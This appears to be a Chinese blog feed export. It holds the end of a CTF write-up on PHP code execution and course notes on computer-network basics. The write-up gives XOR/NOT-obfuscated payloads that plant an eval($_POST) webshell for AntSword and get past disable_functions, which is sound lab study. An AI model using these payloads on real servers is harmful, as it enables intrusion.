<p>这里给一个自己写的异或的脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">payload</span>):</span></span><br><span class="line">    str1 = []</span><br><span class="line">    str2 = []</span><br><span class="line">    res1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    res2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> payload:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>, <span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>,<span class="number">256</span>):</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">ord</span>(p)==i^j:</span><br><span class="line">                    str1.append(i)</span><br><span class="line">                    str2.append(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">        res1 += <span class="built_in">str</span>(<span class="built_in">hex</span>(i))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str2:</span><br><span class="line">        res2 += <span class="built_in">str</span>(<span class="built_in">hex</span>(i))</span><br><span class="line">    <span class="built_in">print</span>(res1.replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;%&#x27;</span>) + <span class="string">&#x27;^&#x27;</span> + res2.replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;%&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = <span class="string">&#x27;_GET&#x27;</span> <span class="comment"># 修改这里就行</span></span><br><span class="line">    xor(payload)</span><br></pre></td></tr></table></figure></p>
<p>首先查看phpinfo信息，如果直接异或得到phpinfo长度会超：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=%80%80%80%80%80%80%80^%f0%e8%f0%e9%ee%e6%ef();  # 远超40了</span><br></pre></td></tr></table></figure></p>
<p>因此如果使用异或需要换一个思路： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=$&#123;_GET&#125;[_]();&amp;_=phpinfo</span><br></pre></td></tr></table></figure></p>
<p>这里利用了：</p>
<ol type="1">
<li>PHP动态函数的特性；</li>
<li>自己写一个
<code>$_GET</code>，然后参数自定义，这样就可以把长度全部放在自定义的参数上，绕过长度限制。</li>
</ol>
<p>将上面的payload异或： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;[_]();&amp;_=phpinfo # 这里其实[_]也可以用&#123;_&#125;代替</span><br></pre></td></tr></table></figure></p>
<p>如果使用取反就很简单了： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span>(urlencode(~<span class="string">&#x27;phpinfo&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果：%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span></span><br></pre></td></tr></table></figure></p>
<p>payload: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure></p>
<p>查看其中的disable_functions信息</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220430184544.png" /></p>
<p>发现命令执行的函数基本都被过滤了，看来之后要绕过。不论如何，先上线蚁剑：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=$_=%80%80%80%80^%df%c7%c5%d4;$&#123;$_&#125;[__]($&#123;$_&#125;[___]);&amp;__=assert&amp;___=eval($_POST[&#x27;ant&#x27;])</span><br><span class="line"></span><br><span class="line">-&gt; ?code=$_=_GET;$&#123;_GET&#125;[__]($&#123;_GET&#125;[___]);&amp;__=assert&amp;___=eval($_POST[&#x27;ant&#x27;])</span><br></pre></td></tr></table></figure></p>
<p>这里需要注意eval不能调用eval，所以需要调用assert，而assert再7.0即以上的版本无法直接把字符串当作代码执行，所以assert调用eval然后再传入数据。[[远程命令、代码执行总结（PHP）]]</p>
<p>取反： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=urlencode(~<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="string">&#x27;(eval($_POST[mochu7]))&#x27;</span>;</span><br><span class="line"><span class="variable">$d</span>=urlencode(~<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B  </span><br><span class="line">%D7%<span class="number">9</span>A%<span class="number">89</span>%<span class="number">9</span>E%<span class="number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%<span class="number">92</span>%<span class="number">90</span>%<span class="number">9</span>C%<span class="number">97</span>%<span class="number">8</span>A%C8%A2%D6%D6</span><br></pre></td></tr></table></figure></p>
<p>payload：(不知道为什么超40了还可以) <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6);</span><br></pre></td></tr></table></figure></p>
<p>然后用蚁剑连接</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220430185612.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220430185739.png" /></p>
<p>发现在根目录下有两个与flag有关的，flag打开是空白，而readflag是可执行文件。调用插件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220430185700.png" /></p>
<p>然后得到一个shell，这个shell是可以执行命令的，直接执行<code>./readflag</code>得到flag</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220430185840.png" /></p>
<p>这里其实还涉及到劫持共享so，但是我不会。</p>
<ul>
<li><a href="https://www.anquanke.com/post/id/175403">深入浅出LD_PRELOAD
&amp; putenv() - 安全客，安全资讯平台</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>disable_functions绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>第 1 章 概论</title>
    <url>/2022/05/30/%E7%AC%AC%201%20%E7%AB%A0%20%E6%A6%82%E8%AE%BA/</url>
    <content><![CDATA[<p>个人的知识笔记。</p>
<span id="more"></span>
<h1 id="基本信息">1. 基本信息</h1>
<p>教材：</p>
<ul>
<li>计算机网络教程 自顶向下方法(第七版)，Computer Networks A Top-Down
Approch</li>
</ul>
<p>课程：</p>
<ul>
<li>中科大 郑烇、杨坚老师(B站就有: <a
href="https://www.bilibili.com/video/BV1JV411t7ow?p=1">中科大郑烇、杨坚全套《计算机网络（自顶向下方法
第7版，James F.Kurose，Keith W.Ross）》课程_哔哩哔哩_bilibili</a>)</li>
</ul>
<h1 id="什么是internet">2. 什么是internet?</h1>
<h2 id="网络概念">2.1. 网络概念</h2>
<blockquote>
<p>蜘蛛网、人际关系网、神经网络等都是网络，这里特指计算机网络。</p>
</blockquote>
<p><strong>网络(network)</strong>：是由一组具有通信能力的设备相互连接形成的。设备可以是<strong>主机(host)</strong>，比如我们的笔记本和平板之类的。也可以是<strong>连接设备</strong>，比如连接网络到其他网络的路由器，将设备连接到一起的交换机，变换数据形式的调制解调器等。</p>
<p>网络又分为：</p>
<ol type="1">
<li>局域网(Local Area Network, LAN)</li>
<li>广域网(Wide Area Network, WAN)</li>
</ol>
<p><strong>LAN和WAN是以物理范围为区分的</strong></p>
<h3 id="局域网">2.1.1. 局域网</h3>
<p><strong>局域网由主机互联形成</strong>。一般来说范围较小，比如办公室、家庭住宅内部的通信设备互相连接，就是一个局域网。一个局域网内的设备都具有一个标识符（某种地址），在该局域网内唯一标识该设备。</p>
<p>局域网一般都是孤立的，比如5台主机形成的局域网主要的作用就是5台主机共享彼此的资源，但是不能获得其他主机的资源（比如，不能去获取Google某台服务器的资源）。</p>
<p>有两种将设备连接到一个局域网的方式：</p>
<ol type="1">
<li>使用公共电缆</li>
<li>使用交换机</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220529103509.png" /></p>
<p><strong>使用公共电缆的原理</strong>：主机1发送给主机8的数据会通过公共电缆发送到所有主机上，主机通过比对数据包中的目的地址和自身地址，如果相同则接收该数据包，否则就丢弃。这意味着安全性不是很高，并且同一时刻只有一对主机在通信，线路资源被占用，其他主机无法使用，否则就会发生碰撞。</p>
<p><strong>使用交换机的原理</strong>：还是主机1发送给主机8的数据。主机1会先将数据包发送给交换机交换机识别数据包中的目的地址，然后根据目的地址，引导数据包从正确的端口发出，到达目的主机。交换机的出现，缓解了整个局域网中的流量，因此此时可以允许多对主机进行通信。</p>
<h3 id="广域网">2.1.2. 广域网</h3>
<p><strong>广域网互联交换机、路由器、调制解调器等连接设备</strong>。广域网的覆盖范围很大，可以是一个城市、一个省、一个国家甚至一整个世界。因此，广域网一般由通信公司建设和运营，其他组织需要使用就进行租用。</p>
<p>广域网一般也有两种类型：</p>
<ol type="1">
<li>点对点广域网</li>
<li>交换式广域网</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220529105939.png" /></p>
<p><strong>点对点广域网</strong>：通过传输介质，连接两个通信设备。实际上，主要的作用是将一个网络连接到另一个网络。</p>
<p><strong>交换式广域网</strong>：具有多个端点，可以认为是多个点到点广域网形成的。主要作用是用来连接多个网络。目前用作全球通信的主干。</p>
<p>可以这么理解广域网和局域网：</p>
<ol type="1">
<li>局域网主要是将附近的主机互联，形成一个网络。同一个局域网内的设备共享彼此的资源。</li>
<li>广域网的作用是将多个网络（可以是局域网，也可以是广域网）互联，使A网络的设备可以使用B网络设备的资源。</li>
</ol>
<h3 id="互联网">2.1.3. 互联网</h3>
<p>要明确，互联网是 internet or
internetwork，也就是<strong>网络的网络</strong>。现在，很少看到孤立的局域网和广域网，一般都连接起来了，这种将网络连接起来形成的网络，就是互联网。</p>
<p>举个例子：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220529111630.png" /></p>
<p>上图中，有两个办公室，一个在西海岸，一个东海岸，办公室内的主机连接形成一个局域网。要想这两个办公室能够进行通信，那么就必须将这两个局域网连接起来，形成点到点广域网。这样，两个办公室的主机就能够访问另一个办公室主机的资源了。</p>
<h2 id="整体框架">2.2. 整体框架</h2>
<p>internet的大致结构如下图（比较简单，真实情况更复杂）：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220529115245.png" /></p>
<p>其中：大圆外面的四个方形的代表的是主机，将主机简单的一分为二，上面的小圆是应用程序，下面的是硬件设备。大圆内部的带叉的圆表示的是路由器等连接设备。边就是连接设备的链路。</p>
<p>上图可以分为三个部分，也是<strong>构成internet的三个部分</strong>。从内到外分别是：</p>
<ol type="1">
<li>网络核心(core)
<ul>
<li>互连着的路由器</li>
<li>网络的网络</li>
</ul></li>
<li>接入网(access)
<ul>
<li>有线或者无线通信链路</li>
</ul></li>
<li>网络边缘(edge)
<ul>
<li>主机</li>
<li>应用程序</li>
</ul></li>
</ol>
<p>网络核心就是由 <strong>连接设备</strong> 和
<strong>连接这些设备的链路(主干链路)</strong>
构成的，主要的功能就是将数据进行转发；网络边缘离我们最近，主要就是我们的电脑，手机，平板等设备，上面运行有许多需要网的程序，比如微信；<strong>接入网就是将网络边缘和网络核心连接起来的部分(接入网链路)</strong>，图中就是四条标红的线，这就是“联网”。</p>
<p>什么是internet? 可以从两个角度来看：</p>
<ol type="1">
<li>具体构成角度</li>
<li>服务的角度</li>
</ol>
<p>从具体构成角度来看，internet的组成如下：</p>
<ol type="1">
<li>节点——各种通信设备
<ul>
<li>主机及其上运行的应用程序</li>
<li>路由器、交互机等网络连接设备</li>
</ul></li>
<li>边——通信链路
<ul>
<li>接入网链路：主机连接到互联网的链路</li>
<li>主干链路：路由器间的链路</li>
</ul></li>
<li>协议</li>
</ol>
<p>其中，协议定义了通信实体之间交换的信息的格式、次序，以及在接收/发送信息之后的动作。如下图，简单的协议</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220529120247.png" /></p>
<p>从服务的角度来看，internet的组成分为两部分：</p>
<ol type="1">
<li>使用通信设施进行通信的分布式<strong>应用程序</strong></li>
<li>为分布式应用程序提供支持的<strong>通信设施</strong></li>
</ol>
<p>这个角度好理解，我们作为用户，只要知道可以使用微信给别人发消息，不需要知道这个消息是怎么到达对方的。因此，该过程中涉及到两个部分，第一是微信这个程序，第二是为发消息提供支持的所有设施（手机、链路等）。</p>
<h1 id="internet结构">3. internet结构</h1>
<p>上面已经介绍了大概的internet结构，再重复一遍。</p>
<p>internet结构的三大部分：</p>
<ol type="1">
<li>网络核心(core)
<ul>
<li>互连着的路由器</li>
<li>网络的网络</li>
</ul></li>
<li>接入网(access)
<ul>
<li>有线或者无线通信链路</li>
</ul></li>
<li>网络边缘(edge)
<ul>
<li>主机</li>
<li>应用程序</li>
</ul></li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220529115245.png" /></p>
<h2 id="网络边缘">3.1. 网络边缘</h2>
<p>端系统(host):</p>
<ul>
<li>运行应用程序</li>
<li>在网络边缘</li>
</ul>
<p>网络边缘主机与主机之间的<strong>通信模式</strong>大致分为两种：</p>
<ol type="1">
<li>客户/服务器模式(C/S mode)</li>
<li>对等模式(p2p, peer to peer)</li>
</ol>
<p>C/S模式比较好理解，就是提供资源的主机充当服务器，请求这些资源的主机充当客户端，由客户端去请求服务器的资源，因此，如果服务器宕机，所有的通信都会中断，并且由于大致上是一对多（当然服务器可能不止一台，但是数量上还是远远小于客户端），所以客户端不能享受到服务器的全部性能，只能与其他客户端“平分”，因此，通信速率不高。</p>
<p>p2p模式下，设备既是服务器，也是客户端。就比如迅雷下载资源的时候，就会提示，如果越多人下载这个资源，速度就会越快，这是为什么呢？道理很简单，如下图，方形的代表主机，字符是主机的标识，数字代表拥有的资源。B，C，D都需要A的资源，但是请求的先后顺序不同，B最先请求，然后是D，最后是C，在某一个时刻，它们拥有的资源如图，接下来以C为例，它可以从B上下载2，5，7的同时从D上下载3，6以及从A下载1，这样子三线一起下载速度肯定快。其他设备也是同理，这就是为什么p2p下载很快的原因，B既是A的客户端，也是C的服务器。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220529142725.png" /></p>
<p>运行在主机上面的应用程序很多，但是不外乎可以分为两类：</p>
<ol type="1">
<li>对通信质量要求十分严格的应用，比如说邮件，远程登录，HTTP，文件传输之类的</li>
<li>对通信质量要求不高，但是对延迟要求很高的应用，比如说直播，音乐之类的流媒体</li>
</ol>
<p>因此，针对这两种不同类型的应用，下层也提供了两种服务（后面会细讲）：</p>
<ol type="1">
<li>TCP(Transmission Control Protocol)：面向连接</li>
<li>UDP(User Datagram Protocol)：无连接</li>
</ol>
<p>TCP提供可靠的服务，面向连接的服务。如何理解这句话呢？举个简单例子，就是两个陌生人A，B。A跟B说“你好”，B出于礼貌也回了句“你好”，那么A，B之间就建立好了“连接”——A知道B能够听到自己说话，B知道A要跟他说话。接下来就能进行其他交流，比如问路呀之类的。交流完毕之后，A说了句“谢谢你，再见”，B回了句“不客气，再见”，此时两者的“连接”就断开了——A跟B说了再见，B也回了再见，两个人都知道对话结束了。</p>
<p><strong>TCP的实现就是这样的，分为三个步骤</strong>：</p>
<ol type="1">
<li>建立连接（互道你好）</li>
<li>数据传输（问路）</li>
<li>终止连接（互道再见）</li>
</ol>
<p>在问路的过程中如果B没听清，那么A会再说一遍，这就叫做“重传”。A说“你知道去西电南校区怎么走吗？”，B回了句“知道，balabala”，这个就是“确认”。如果A说的太快了，B没听清，那么B会说“你说慢点，别急”，这就是“流量控制”。假如此时B忽然接到一个重要的电话，那么A就会停止询问，等待B接完电话，这就是“拥塞控制”。并且A说1，2，3，4，B收到的也一定是1，2，3，4，顺序不会打乱。</p>
<p>因此，TCP能够向上层（应用）提供可靠的，面向连接的服务，为了抱枕可靠性，需要做到以下几点：</p>
<ul>
<li>确认与重传：保证数据次序正确，数据不丢失</li>
<li>流量控制：发送的数据不会太快，也不会太慢，保证接收方能够成功接收</li>
<li>拥塞控制：当网络拥塞的时候，发送方会降低发送速率</li>
</ul>
<p>UDP就很简单，它不保证可靠性，上层应用给我的数据，我就直接发出去就完事了。收到的数据也直接解封装之后发给上层，不会像TCP一样考虑那么多。因此UDP：</p>
<ul>
<li>无连接</li>
<li>不可靠</li>
<li>无流量控制</li>
<li>无拥塞控制</li>
</ul>
<p>但是也有好处呀，与TCP相比速率更快，效率更高。比如两个人问路，对比图如下</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530214313.png" /></p>
<p>这就是TCP和UDP的效率差别。但是TCP能够保证会话正常进行，UDP可能收不到对方的答复，并且在数据很大的时候，连接的耗时完全可以忽略不记。总之呢，没有孰优孰劣，只有适合于不适合。</p>
<h2 id="网络核心">3.2. 网络核心</h2>
<p><strong>网络核心</strong>：路由器组成的网状网络</p>
<p><strong>基本问题</strong>：数据怎么样通过网络进行传输？</p>
<p>数据交换有两种方案：</p>
<ol type="1">
<li>电路交换</li>
<li>分组交换</li>
</ol>
<h3 id="电路交换">3.2.1. 电路交换</h3>
<p>端到端的资源被分配给源和目标之间的通信。其他主机无法使用这些被分配出去的资源。因此，这种模式的特点就是<strong>独享资源</strong>。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220529150507.png" /></p>
<p>比如上图中，路由器之间的链路资源大，分成了4份，左上角和右下角的主机之间的通信占用了上链路的第二个线路和右链路的第一个线路。即使两台主机之间没有数据发送，这些资源也不会给其他主机使用，只能被浪费。通常被传统的固化网络所采用。</p>
<p>因此，电路交换的特点有</p>
<ul>
<li>建立连接，预留资源</li>
<li>独享资源</li>
<li>保证性能</li>
<li>网络资源分片（<strong>多路复用</strong>）
<ul>
<li>频分(Frequency-divisiton multiplexing, FDM)</li>
<li>时分(Time-division multiplexing, TDM)</li>
<li>波分(Wave-division multiplexing, WDM)</li>
<li>码分(Code-division multiplexing, CDM)</li>
</ul></li>
</ul>
<p>电路交换主要使用的资源分片是FDM和TDM</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220529154925.png" /></p>
<p>下个结论：电路交换不适合计算机之间通信。首先，计算机之间的通信是具有很强的突发性的，比如平常上网，我们浏览页面一般都是点一下，看一会，点一下，看一会，忽然朋友推荐了个视频，再去看视频，这样的，这些过程的可能持续时间短，也可能长时间网络冲浪。这就意味着，我从浏览网页的时候，就需要建立连接，然后我们在浏览页面（没有发出请求）的时候，连接也保持的，这就会造成极大的资源浪费（请求3s，浏览几分钟）。因此，电路交换不适合计算机之间通信。</p>
<h3 id="分组交换">3.2.2. 分组交换</h3>
<p>分组交换的主要特点有：</p>
<ul>
<li>网络带宽资源不再分片，传输是使用全部资源；</li>
<li>主机之间的数据被分成一个个分组；</li>
<li>存储-转发：
<ul>
<li>分组每次移动一跳(hop)，就是分组一次就发送到周边的一个设备；</li>
<li>设备必须收到一个完整的分组，才能够进行转发；</li>
<li>一个设备上可能存在多个分组，因此需要排队（排队队列）</li>
</ul></li>
<li><strong>资源共享，按需使用</strong></li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220529154045.png" /></p>
<p>其实分组交换也可以看成是时分，因为同一时刻只传送一个分组，只不过并没有像时分那样分的那么清楚，而是根据队列中是否有分组，有就从队头取出来发送，没有的话就空闲。也叫做<strong>统计多路复用</strong></p>
<p>分组交换中，分组的存储转发一段一段的从源传输到目标，按照有无网络层连接分成：</p>
<ol type="1">
<li><strong>数据报网络</strong>
<ul>
<li>分组的目标地址决定下一跳</li>
<li>不同的阶段，路由可以改变</li>
<li>无网络层连接</li>
</ul></li>
<li><strong>虚电路网络</strong>
<ul>
<li>每个分组都带标签，标签决定下一跳</li>
<li>在呼叫建立时决定路径，整个传输过程中保存不变</li>
<li>路由器维持路径状态</li>
<li>有网络层连接</li>
</ul></li>
</ol>
<h4 id="数据报网络">3.2.2.1. 数据报网络</h4>
<p>在通信之前，无需建立连接，有数据直接传输，每一个分组都独立路由。因此路径不一样，也可能失序。路由器根据分组的目标地址进行路由。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530110225.png" /></p>
<h4 id="虚电路网络">3.2.2.2. 虚电路网络</h4>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530110242.png" /></p>
<p>分组中携带标签，比如说H1的分组就会携带下一跳的标签
<code>B2</code>，意思是要去B路由器，通过端口2转发，A收到这样的消息之后就会根据标签的意思作，并且会会修改分组中的标签
<code>C3</code>，然后B收到之后就会根据意思传给C，依此类推直到H4。</p>
<p>路由功能只在虚电路建立的时候使用，建立完毕之后路径就确定，因此分组只使用标签和虚电路号就可以确定路径，不需要目的地址。</p>
<blockquote>
<p>结合了分组交换和电路交换的特点。在虚电路建立的时候使用路由确定路径，在之后使用电路交换保证可靠性。</p>
</blockquote>
<p>其实也没那么可靠，因为如果路径中某一点坏了，其他点是不知道的，一直给它发数据，而它又无法将数据转发给下一个，因此此次通信就作废了，需要重新建立虚电路。</p>
<p><strong>对比</strong>：</p>
<ul>
<li>数据报：不确定路径，一边走一边找</li>
<li>虚电路：先去一次，熟悉路线（建立），接下来的数据按照这条路线走。</li>
</ul>
<h3 id="网络核心功能">3.2.3. 网络核心功能</h3>
<p>因此网络核心的主要功能就是两：</p>
<ol type="1">
<li><strong>路由</strong>：决定分组采用的源到目标的路径</li>
<li><strong>转发</strong>：将分组从路由器哪个输入链路转出</li>
</ol>
<p>路由是一个整体的概念，路由器需要找出从源到目标的路径。转发就是一个个体的概念，数据到达路由器的时候，路由器需要接收，并且确定从自己的哪个端口把这个数据包发出去。从源到目标的所有转发过程的总和就是路由。</p>
<p>无论是路由还是转发，依赖的都是路由器中的<strong>路由表</strong>和分组中的<strong>目标地址</strong>。对比目标地址和路由表，决定从哪个端口转发。</p>
<h3 id="分组交换和电路交换的对比">3.2.4. 分组交换和电路交换的对比</h3>
<p>分组交换与电路交换比较，主要有两个好处：</p>
<ol type="1">
<li>同样的网络资源，分组交换允许更多的用户使用网络</li>
<li>分组交换更适合“突发数据”，因为共享资源</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220529155909.png" /></p>
<p>假设上图中，路由器向外发送数据的链路资源为
1Mbps，而每个用户向路由器发送数据的链路资源为
100Kbps，且每个用户的活动概率为10%。</p>
<p>如果采用电路交换，很容易算出来，最多容纳10个用户，也就是 <span
class="math inline">\(N=10\)</span></p>
<p>但是，如果采用分组交换，假设 <span
class="math inline">\(N=35\)</span>，那么同时有10个或以上活动的用户的概率为：</p>
<p><span class="math display">\[
P=1-\sum_{n=0}^9C_{35}^9p^n(1-p)^{35-n}=0.0004
\]</span></p>
<p>也就是如果总共有35个用户，同一时刻有10个或以上的用户一起活动的概率为0.04%，概率非常低。因此，分组交换能够容纳的用户会比35多。</p>
<blockquote>
<p>如果同时有10个用户活动，那么对于路由器来说，流量强度就会为1，那么这个网络就挂了，排队时间趋于无穷。</p>
</blockquote>
<p>适合突发式数据传输：</p>
<ul>
<li>资源共享</li>
<li>简单，不必呼叫</li>
</ul>
<p>因此，分组交换更适合计算机通信。</p>
<p>网络分类：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220529161204.png" /></p>
<h2 id="接入网">3.3. 接入网</h2>
<h3 id="接入到internet">3.3.1. 接入到internet</h3>
<ol type="1">
<li>电话网络
<ul>
<li>拨号服务</li>
<li>DSL(Digital Subscriber Line)服务</li>
</ul></li>
<li>有线电视网络</li>
<li>无线网络</li>
<li>直接连接到internet</li>
</ol>
<p><strong>拨号服务</strong>：在原有的电话线路中增加将数据转换成语音（调制）/将语音转换为数据（解调）的调制解调器。这种方式有两个缺点：一是速率慢，因为原有的电话线路的带宽比较窄；二是打电话的时候不能上网，上网的时候不能打电话，因为线路只能被二者中的一个占用。</p>
<p><strong>DSL服务</strong>：电话公司升级了电话线路，使其能够支持更宽的带宽，将其0.3-4khz保留给电话，更高的部分留给了网络，使其能够一边打电话，一边上网。除此之外，将网络的带宽分为了两部分：上行（主机到网络的流量）和下行（网络到主机的流量），一般来说两者是不对称的，下行的带宽是远大于上行的，这是家用的情况下，但是企业使用的话一般都需要比较大的上行带宽，所以需要向供应商购买。</p>
<p><strong>调制解调器</strong>：modem，就是我们常说的“猫”。</p>
<p>随着时代的发展，越来越多的家庭使用有线电视服务（我们家乡叫做“毕录”）代替天线接收电视。并且，有线电视公司将其有线电视网络接入到internet，因此，用户可以通过将设备接入到有线电视网络从而接入到internet。</p>
<p><strong>无线网络</strong>：每个家庭都会买一个设备叫做 wireless access
point，简称WAP。我们的设备通过WAP连接成一个局域网，WAP会通过线路连接到路由器，最终访问internet。这里的路由器也不可能是专用的，哈哈哈哈哈哈哈。</p>
<p>我们日常中买的无线路由器严格来说不算是计算机网络中的路由器，但是也具有相应的功能。除了具有路由器的功能之外，还具有许多其他功能。</p>
<p>上面的三种方式一般都是家庭使用的。公司/企业/学校等大型组织就是直接接入internet。直接将组织内的终端接入交换机，交换机层层级联，最终接入到一个路由器，由这个路由器接入internet。</p>
<h3 id="物理介质">3.3.2. 物理介质</h3>
<p><strong>物理链路</strong>：连接没给发送-接收对之间的物理媒体。可以分为下面两种：</p>
<ol type="1">
<li><strong>导引型媒体</strong>：信号沿着固体媒介被引导</li>
<li><strong>非导引型媒体</strong></li>
</ol>
<p>导引型的一般有：</p>
<ul>
<li>双绞线</li>
<li>同轴电缆</li>
<li>光纤和光缆</li>
</ul>
<p>非导引型一般有：</p>
<ul>
<li>地面微波</li>
<li>LAN，比如Wi-Fi</li>
<li>WAN，比如3G，4G，5G</li>
<li>卫星</li>
</ul>
<h2 id="internet结构和isp">3.4. internet结构和ISP</h2>
<p>从上一节可以知道，端系统通过接入ISPs，然后连接到internet，因此，接入ISPs必须是互联的，这样子任何2个端系统可以互相发送分组到对方。</p>
<p>问题：这个世界上有数以百万计的ISPs，如何将它们互联呢？</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530081108.png" /></p>
<p>有一种特别简单的想法，那就是两两互联，每个ISP都与其他所有ISPs拉一根线路。如果ISP的数量为N，那么连接的的线路的数量
<span class="math inline">\(n=N(N-1)/2\)</span> 也就是 <span
class="math inline">\(O(N^2)\)</span> 的数量级，如果 <span
class="math inline">\(N=100000\)</span>
，那么这么做就不经济。并且就算真的连接了，以后没增加一个ISP，就需要多新增N+1的线路，几乎没有拓展性</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530084506.png" /></p>
<p>因此，历史给出的答案是将接入ISP连接到全局ISP</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530084549.png" /></p>
<p>有一个组织/公司/机构在全球各地布置路由器，构成全球ISP，然后各地的接入ISP可以通过该全球ISP互相访问。但是问题是：全球用户非常多，一个全球ISP根本无力承担，并且这里面有利可图，其他组织也会去搭建全球ISP，那么就会变成下面这种情况</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530084902.png" /></p>
<p>每个全球ISP都有自己的用户，在ISPA内的用户可以互相访问，但是不能访问ISPB的用户。因此，这些全球ISP之间也会有竞争和合作</p>
<ul>
<li>竞争：因为全球ISP有利可图，会有很多的公司会构建全球ISP</li>
<li>合作：全球ISP之间只需要使用几个线路连接起来就可以共享彼此的用户、流量</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530085134.png" /></p>
<p>向上图，这样子，全球的用户就能够互相访问了。紧接着，业务就会细分，出现全球接入和区域接入（很简单，在中国，最好就是细分成比如说各个省的区域ISP，然后再连接到全球ISP），如下图</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530085413.png" /></p>
<p>然后，内容提供者(ICP, Internet Content
Providers)可能会构建它们自己的网络，将它们的服务更加靠经端用户，向用户提供更好的服务，减少自己的运营支出。最后变成下图的结构</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530085854.png" /></p>
<p>这里又分成了三层，松散的层次模型：</p>
<ol type="1">
<li>第一层ISP，国家/国际覆盖，速率极高，但是数量不多。
<ul>
<li>直接与其他第一层ISP相连</li>
<li>与大量的第二次ISP和其他客户网络相连</li>
